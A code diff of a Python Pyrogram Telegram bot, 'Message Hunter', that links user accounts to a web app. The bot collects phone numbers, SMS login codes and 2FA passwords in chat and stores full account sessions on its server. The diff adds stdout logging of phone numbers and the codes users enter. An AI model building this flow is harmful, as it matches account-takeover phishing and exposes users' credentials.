@@ -25,54 +25,41 @@ def save_user_session(user_id, session_data):
         with open(f'user_sessions/{user_id}.json', 'w', encoding='utf-8') as f:
             json.dump(session_data, f, ensure_ascii=False, indent=2)
         print(f"✅ Сессия сохранена для {user_id}")
-        
-        # Уведомляем веб-приложение
-        with open('auth_notifications.txt', 'a') as f:
-            f.write(f"{user_id}:SUCCESS\n")
             
     except Exception as e:
         print(f"❌ Ошибка сохранения сессии: {e}")
-        with open('auth_notifications.txt', 'a') as f:
-            f.write(f"{user_id}:ERROR:{str(e)}\n")
 
 @bot_app.on_message(filters.command("start"))
-def start_command(client, message):
+async def start_command(client, message):
     user_id = message.from_user.id
+    
+    print(f"🤖 Получена команда /start от пользователя {user_id}")
     
     # Проверяем есть ли параметр (для авторизации с сайта)
     if len(message.command) > 1:
         web_user_id = message.command[1]
+        print(f"🔗 Авторизация для веб-пользователя: {web_user_id}")
         
-        if web_user_id == "web_login":
-            # Старая логика для веб-входа
-            auth_code = f"WEB{user_id}"
-            message.reply_text(
-                f"🔐 Ваш код для входа в веб-интерфейс:\n\n"
-                f"`{auth_code}`\n\n"
-                f"Скопируйте этот код и вставьте на сайте."
-            )
-        else:
-            # Новая логика для подключения аккаунта
-            user_states[user_id] = {'web_user_id': web_user_id, 'step': 'waiting_phone'}
-            
-            message.reply_text(
-                f"🔐 Подключение аккаунта для веб-приложения\n\n"
-                f"📱 Отправьте ваш номер телефона в формате:\n"
-                f"+380991234567\n\n"
-                f"⚠️ Это безопасно - авторизация происходит через официальный Telegram API"
-            )
+        # Сохраняем состояние пользователя
+        user_states[user_id] = {
+            'web_user_id': web_user_id, 
+            'step': 'waiting_phone'
+        }
+        
+        print(f"✅ Состояние сохранено для {user_id}: {user_states[user_id]}")
+        
+        await message.reply_text(
+            f"🔐 **Подключение аккаунта для веб-приложения**\n\n"
+            f"📱 Отправьте ваш номер телефона в формате:\n"
+            f"`+380991234567`\n\n"
+            f"⚠️ Это безопасно - авторизация происходит через официальный Telegram API"
+        )
     else:
-        # Обычный старт - показываем кнопку веб-приложения
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔍 Открыть поиск", 
-                                web_app={"url": "https://10ea-2a09-bac1-7540-10-00-84-95.ngrok-free.app"})]
-        ])
-        
-        message.reply_text(
-            "🔍 **Message Hunter**\n\n"
-            "Поиск сообщений в Telegram группах\n\n"
-            "Нажмите кнопку ниже для начала работы:",
-            reply_markup=keyboard
+        # Обычный старт - показываем информацию
+        await message.reply_text(
+            "🔍 **Message Hunter Bot**\n\n"
+            "Этот бот используется для подключения вашего аккаунта к веб-приложению.\n\n"
+            "Для начала работы перейдите на сайт и нажмите 'Подключить аккаунт'."
         )
 
 @bot_app.on_message(filters.text & filters.private & ~filters.command("start"))
@@ -80,138 +67,184 @@ async def handle_text(client, message):
     user_id = message.from_user.id
     text = message.text.strip()
     
+    print(f"📝 Получен текст от {user_id}: {text}")
+    print(f"🔍 Активные состояния: {list(user_states.keys())}")
+    
     if user_id not in user_states:
-        await message.reply_text("Нажмите /start для начала")
+        await message.reply_text(
+            "❌ Нет активного процесса авторизации.\n\n"
+            f"🔍 **Отладочная информация:**\n"
+            f"Ваш ID: `{user_id}`\n"
+            f"Активные сессии: {len(user_states)}\n\n"
+            f"Получите новую ссылку на сайте или нажмите /start"
+        )
         return
     
     user_data = user_states[user_id]
+    print(f"📊 Состояние пользователя {user_id}: {user_data}")
     
     if user_data['step'] == 'waiting_phone':
-        if text.startswith('+') and len(text) >= 10:
-            try:
-                # Создаем клиент для пользователя
-                session_name = f"user_session_{user_data['web_user_id']}"
-                user_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
-                
-                await user_client.connect()
-                sent_code = await user_client.send_code(text)
-                
-                # Сохраняем данные
-                user_clients[user_id] = user_client
-                temp_auth_data[user_id] = {
-                    'phone': text,
-                    'phone_code_hash': sent_code.phone_code_hash
-                }
-                
-                user_states[user_id]['step'] = 'waiting_code'
-                
-                await message.reply_text(
-                    f"📨 Код отправлен на {text}\n\n"
-                    f"⏱️ Введите 5-значный код из SMS БЫСТРО:"
-                )
-                
-            except Exception as e:
-                await message.reply_text(f"❌ Ошибка отправки кода: {str(e)}")
-        else:
-            await message.reply_text("❌ Неверный формат. Используйте: +380991234567")
-    
+        await handle_phone_input(client, message, user_id, text, user_data)
     elif user_data['step'] == 'waiting_code':
-        if text.isdigit() and len(text) == 5:
-            try:
-                auth_data = temp_auth_data[user_id]
-                user_client = user_clients[user_id]
-                
-                # Авторизуемся
-                await user_client.sign_in(
-                    auth_data['phone'], 
-                    auth_data['phone_code_hash'], 
-                    text
-                )
-                
-                # Получаем информацию
-                me = await user_client.get_me()
-                await user_client.disconnect()
-                
-                # Сохраняем сессию
-                session_data = {
-                    'is_connected': True,
-                    'phone': auth_data['phone'],
-                    'user_info': {
-                        'first_name': me.first_name or '',
-                        'last_name': me.last_name or '',
-                        'username': me.username or '',
-                        'user_id': str(me.id)
-                    }
-                }
-                
-                save_user_session(user_data['web_user_id'], session_data)
-                
-                # Очищаем данные
-                del user_states[user_id]
-                del temp_auth_data[user_id]
-                del user_clients[user_id]
-                
-                # Отправляем успешное сообщение
-                await message.reply_text(
-                    f"✅ Аккаунт {me.first_name} успешно подключен!\n\n"
-                    f"Теперь вернитесь на сайт и нажмите 'Проверить подключение'"
-                )
-                
-            except Exception as e:
-                if "SESSION_PASSWORD_NEEDED" in str(e):
-                    user_states[user_id]['step'] = 'waiting_2fa'
-                    await message.reply_text("🔐 Введите пароль двухфакторной аутентификации:")
-                elif "PHONE_CODE_EXPIRED" in str(e):
-                    await message.reply_text("⏰ Код истек. Начните заново с /start")
-                    if user_id in user_states:
-                        del user_states[user_id]
-                    if user_id in temp_auth_data:
-                        del temp_auth_data[user_id]
-                    if user_id in user_clients:
-                        try:
-                            await user_clients[user_id].disconnect()
-                        except:
-                            pass
-                        del user_clients[user_id]
-                else:
-                    await message.reply_text(f"❌ Ошибка: {str(e)}")
-        else:
-            await message.reply_text("❌ Введите 5-значный код")
-    
+        await handle_code_input(client, message, user_id, text, user_data)
     elif user_data['step'] == 'waiting_2fa':
-        try:
-            user_client = user_clients[user_id]
-            await user_client.check_password(text)
-            
-            me = await user_client.get_me()
-            await user_client.disconnect()
-            
-            session_data = {
-                'is_connected': True,
-                'phone': temp_auth_data[user_id]['phone'],
-                'user_info': {
-                    'first_name': me.first_name or '',
-                    'last_name': me.last_name or '',
-                    'username': me.username or '',
-                    'user_id': str(me.id)
-                }
+        await handle_2fa_input(client, message, user_id, text, user_data)
+
+async def handle_phone_input(client, message, user_id, phone, user_data):
+    """Обработка ввода номера телефона"""
+    if not (phone.startswith('+') and len(phone) >= 10):
+        await message.reply_text("❌ Неверный формат. Используйте: `+380991234567`")
+        return
+    
+    try:
+        print(f"📱 Отправляем код на номер: {phone}")
+        
+        # Создаем клиент для пользователя
+        session_name = f"user_session_{user_data['web_user_id']}"
+        user_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
+        
+        await user_client.connect()
+        sent_code = await user_client.send_code(phone)
+        
+        # Сохраняем данные
+        user_clients[user_id] = user_client
+        temp_auth_data[user_id] = {
+            'phone': phone,
+            'phone_code_hash': sent_code.phone_code_hash
+        }
+        
+        user_states[user_id]['step'] = 'waiting_code'
+        
+        print(f"✅ Код отправлен на {phone}")
+        
+        await message.reply_text(
+            f"📨 **Код отправлен на {phone}**\n\n"
+            f"⏱️ Введите 5-значный код из SMS:\n"
+            f"Например: `12345`"
+        )
+        
+    except Exception as e:
+        print(f"❌ Ошибка отправки кода: {e}")
+        await message.reply_text(f"❌ Ошибка отправки кода: {str(e)}")
+
+async def handle_code_input(client, message, user_id, code, user_data):
+    """Обработка ввода SMS кода"""
+    if not (code.isdigit() and len(code) == 5):
+        await message.reply_text("❌ Введите 5-значный код (только цифры)")
+        return
+    
+    try:
+        print(f"🔐 Проверяем код: {code}")
+        
+        auth_data = temp_auth_data[user_id]
+        user_client = user_clients[user_id]
+        
+        # Авторизуемся
+        await user_client.sign_in(
+            auth_data['phone'], 
+            auth_data['phone_code_hash'], 
+            code
+        )
+        
+        # Получаем информацию о пользователе
+        me = await user_client.get_me()
+        await user_client.disconnect()
+        
+        # Сохраняем сессию
+        session_data = {
+            'is_connected': True,
+            'phone': auth_data['phone'],
+            'user_info': {
+                'first_name': me.first_name or '',
+                'last_name': me.last_name or '',
+                'username': me.username or '',
+                'user_id': str(me.id)
             }
-            
-            save_user_session(user_data['web_user_id'], session_data)
-            
-            # Очищаем данные
-            del user_states[user_id]
-            del temp_auth_data[user_id]
-            del user_clients[user_id]
-            
+        }
+        
+        save_user_session(user_data['web_user_id'], session_data)
+        
+        # Очищаем временные данные
+        cleanup_user_data(user_id)
+        
+        print(f"✅ Авторизация завершена для {me.first_name}")
+        
+        await message.reply_text(
+            f"✅ **Аккаунт успешно подключен!**\n\n"
+            f"👤 Пользователь: {me.first_name}\n"
+            f"📱 Телефон: {auth_data['phone']}\n\n"
+            f"Теперь вернитесь на сайт и нажмите **'Проверить подключение'**"
+        )
+        
+    except Exception as e:
+        error_str = str(e)
+        print(f"❌ Ошибка авторизации: {error_str}")
+        
+        if "SESSION_PASSWORD_NEEDED" in error_str:
+            user_states[user_id]['step'] = 'waiting_2fa'
             await message.reply_text(
-                f"✅ Аккаунт {me.first_name} успешно подключен!\n\n"
-                f"Теперь вернитесь на сайт и нажмите 'Проверить подключение'"
+                "🔐 **Требуется пароль двухфакторной аутентификации**\n\n"
+                "Введите ваш пароль 2FA:"
             )
-            
-        except Exception as e:
-            await message.reply_text(f"❌ Неверный пароль 2FA: {str(e)}")
+        elif "PHONE_CODE_EXPIRED" in error_str:
+            cleanup_user_data(user_id)
+            await message.reply_text("⏰ Код истек. Начните заново - получите новую ссылку на сайте")
+        elif "PHONE_CODE_INVALID" in error_str:
+            await message.reply_text("❌ Неверный код. Попробуйте еще раз")
+        else:
+            await message.reply_text(f"❌ Ошибка: {error_str}")
+
+async def handle_2fa_input(client, message, user_id, password, user_data):
+    """Обработка пароля 2FA"""
+    try:
+        print(f"🔐 Проверяем пароль 2FA")
+        
+        user_client = user_clients[user_id]
+        await user_client.check_password(password)
+        
+        me = await user_client.get_me()
+        await user_client.disconnect()
+        
+        session_data = {
+            'is_connected': True,
+            'phone': temp_auth_data[user_id]['phone'],
+            'user_info': {
+                'first_name': me.first_name or '',
+                'last_name': me.last_name or '',
+                'username': me.username or '',
+                'user_id': str(me.id)
+            }
+        }
+        
+        save_user_session(user_data['web_user_id'], session_data)
+        cleanup_user_data(user_id)
+        
+        print(f"✅ Авторизация с 2FA завершена для {me.first_name}")
+        
+        await message.reply_text(
+            f"✅ **Аккаунт успешно подключен!**\n\n"
+            f"👤 Пользователь: {me.first_name}\n\n"
+            f"Теперь вернитесь на сайт и нажмите **'Проверить подключение'**"
+        )
+        
+    except Exception as e:
+        print(f"❌ Ошибка 2FA: {e}")
+        await message.reply_text(f"❌ Неверный пароль 2FA. Попробуйте еще раз")
+
+def cleanup_user_data(user_id):
+    """Очистка временных данных пользователя"""
+    try:
+        if user_id in user_states:
+            del user_states[user_id]
+        if user_id in temp_auth_data:
+            del temp_auth_data[user_id]
+        if user_id in user_clients:
+            del user_clients[user_id]
+        print(f"🧹 Очищены данные для пользователя {user_id}")
+    except Exception as e:
+        print(f"❌ Ошибка очистки данных: {e}")
 
 if __name__ == "__main__":
     print("🤖 Основной бот запускается...")
+    print("🔗 Бот готов принимать команды...")
     bot_app.run()
